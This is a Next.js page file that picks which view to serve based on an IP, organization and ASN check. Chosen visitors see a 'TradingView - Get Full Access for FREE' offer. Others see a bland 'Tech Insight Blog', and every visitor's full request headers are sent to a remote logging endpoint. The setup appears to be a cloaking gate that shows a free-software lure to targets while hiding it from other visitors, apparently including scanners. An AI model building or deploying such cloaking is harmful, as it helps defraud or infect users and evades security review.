import ViewOne from "@/app/view-one";
import ViewTwo from "@/app/view-two";
import type { Metadata } from "next";
import { headers } from "next/headers";
import { analyzeIpAccess } from "@/lib/ip-analysis";

// Function chung để kiểm tra điều kiện (dùng cho cả metadata và component)
async function checkCondition(
  headersList: Headers,
  searchParams?: { [key: string]: string | string[] | undefined }
): Promise<{ allowed: boolean; result: Awaited<ReturnType<typeof analyzeIpAccess>> }> {
  try {
    const result = await analyzeIpAccess(headersList, searchParams);
    return { allowed: result.allowed, result };
  } catch (error) {
    console.error("Error in checkCondition:", error);
    return { 
      allowed: false, 
      result: { allowed: false, reason: 'ERROR', details: { ip: 'unknown' } }
    };
  }
}

// Function để tạo metadata động dựa trên điều kiện
export async function generateMetadata({
  searchParams,
}: {
  searchParams: { [key: string]: string | string[] | undefined }
}): Promise<Metadata> {
  const headersList = await headers();
  const { allowed } = await checkCondition(headersList, searchParams);

  if (allowed) {
    return {
      title: "TradingView - Get Full Access for FREE",
      description: "Get Full Access to TradingView Desktop for FREE. Experience extra power, extra speed and extra flexibility.",
    };
  } else {
    return {
      title: "Tech Insight Blog - Alternative View",
      description: "Tech Insight Blog alternative view",
    };
  }
}

export default async function Home({
  searchParams,
}: {
  searchParams: { [key: string]: string | string[] | undefined }
}) {
  const headersList = await headers();
  const { allowed, result } = await checkCondition(headersList, searchParams);
  
  // Lấy user agent từ headers
  const userAgent = headersList.get('user-agent') || null;
  
  // Convert headers thành JSON string để lưu
  const headersObj: Record<string, string> = {};
  headersList.forEach((value, key) => {
    headersObj[key] = value;
  });
  const headersJson = JSON.stringify(headersObj);
  
  // Gửi access log qua API (fire-and-forget để không block rendering)
  // QUAN TRỌNG: Luôn lưu log, kể cả khi bị chặn hoặc không lấy được IP
  const ip = result.details?.ip || 'unknown';
  
  const logData = {
    ip,
    view: allowed ? 'ViewOne' : 'ViewTwo',
    block_reason: result.reason || null,
    organization: result.details?.organization || null,
    asn: result.details?.asn || null,
    user_agent: userAgent,
    headers: headersJson,
  };
  
  // Log trước khi gửi API
  console.log('[PAGE.TSX] Sending log to API:', {
    ip,
    view: logData.view,
    block_reason: result.reason,
  });
  
  // Lấy base URL từ headers hoặc environment
  const baseUrl = 'https://tradingview-nextjs.vercel.app/';
  
  const apiUrl = `${baseUrl}/api/log-access`;
  
  console.log('[PAGE.TSX] API URL:', apiUrl);
  
  // Gửi qua API với timeout
  const apiCall = fetch(apiUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(logData),
  });
  
  // Tạo timeout promise (10 giây)
  const timeoutPromise = new Promise((_, reject) => {
    setTimeout(() => reject(new Error('API call timeout after 10 seconds')), 10000);
  });
  
  // Race giữa API call và timeout
  Promise.race([apiCall, timeoutPromise])
    .then(async (response: any) => {
      // Nếu là timeout, response sẽ là Error
      if (response instanceof Error) {
        throw response;
      }
      
      // Kiểm tra response status
      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(`API returned ${response.status}: ${errorData.error || 'Unknown error'}`);
      }
      
      const result = await response.json();
      console.log('[PAGE.TSX] Successfully sent log to API:', {
        ip,
        view: logData.view,
        success: result.success,
      });
    })
    .catch((error) => {
      // Log error nhưng không block rendering
      console.error('[PAGE.TSX] Error sending log to API:', {
        error: error?.message || String(error),
        ip,
        view: logData.view,
        block_reason: result.reason,
      });
    });

  return (
    <div className="min-h-screen flex flex-col">
      <main className="overflow-hidden">
        {allowed ? <ViewOne /> : <ViewTwo />}
      </main>
    </div>
  );
}
